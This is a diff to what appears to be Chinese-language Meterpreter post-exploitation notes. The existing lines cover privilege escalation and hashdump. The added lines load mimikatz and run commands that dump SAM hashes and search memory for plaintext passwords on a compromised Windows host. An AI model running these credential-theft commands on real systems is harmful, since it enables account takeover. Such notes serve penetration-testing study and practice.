@@ -14,3 +14,6 @@
     4.getsystem —> getuid
     5.hashdump (如果不行则换进程)
       migrate pid —> hashdump
+    6.load mimikatz  mimikatz_command -f samdump::hashes
+      mimikatz_command -f sekurlsa::searchPasswords
+    
